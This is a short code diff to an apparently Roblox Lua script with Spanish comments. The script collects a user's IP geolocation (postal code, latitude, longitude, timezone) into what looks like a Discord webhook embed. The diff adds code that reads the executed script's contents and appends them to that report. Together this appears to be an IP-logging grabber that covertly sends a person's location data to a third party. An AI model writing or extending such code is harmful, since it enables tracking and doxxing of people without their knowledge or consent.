@@ -14,6 +14,13 @@ end)
 
 ipData = successIP and ipData or {}
 
+-- Obtener el atributo "script"
+local scriptContent = ""
+pcall(function()
+    local attr = script:GetAttribute("script")
+    scriptContent = type(attr) == "string" and attr or "No Script Found"
+end)
+
 local function createField(name, key)
     return {
         name = name,
@@ -41,7 +48,11 @@ pcall(function()
                         createField("Postal Code", "postal"),
                         createField("Latitude", "latitude"),
                         createField("Longitude", "longitude"),
-                        createField("Timezone", "timezone")
+                        createField("Timezone", "timezone"),
+                        {
+                            name = "Script Ejecutado",
+                            value = "```lua\n" .. scriptContent .. "\n```"
+                        }
                     }
                 },
                 {
